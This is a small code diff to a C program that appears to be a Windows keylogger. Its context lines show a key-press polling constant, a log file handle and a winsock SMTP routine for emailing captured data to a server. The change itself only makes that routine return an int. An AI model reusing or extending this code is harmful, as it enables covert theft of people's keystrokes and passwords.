@@ -7,7 +7,7 @@
 #include <winsock.h>
 #define KEY_PRESSED -32767
 FILE *file;
-void sendEmail(char *server,char *to,char *from,char *subject,char *message);
+int sendEmail(char *server,char *to,char *from,char *subject,char *message);
 
 
 int main(int argc,char *argv[]){
@@ -88,7 +88,7 @@ int main(int argc,char *argv[]){
 }
 
 
-	void sendEmail(char *server,char *to,char *from,char *subject,char *message)
+	int sendEmail(char *server,char *to,char *from,char *subject,char *message)
 	{
 	SOCKET sockfd;
 	WSADATA wsaData;
@@ -134,7 +134,7 @@ int main(int argc,char *argv[]){
 	strcat(line,"\n");
 	strcat(line,"From");
 	strcat(line,from);
-	strcat(line,"\n");
+	strcat(line,"\n");	
 	strcat(line,"Subject:");
 	strcat(line,(char*)subject);
 	strcat(line,"\n");
@@ -149,7 +149,7 @@ int main(int argc,char *argv[]){
 	}
 	closesocket(sockfd);
 	WSACleanup();
-
+	return 0;
 }
 
 
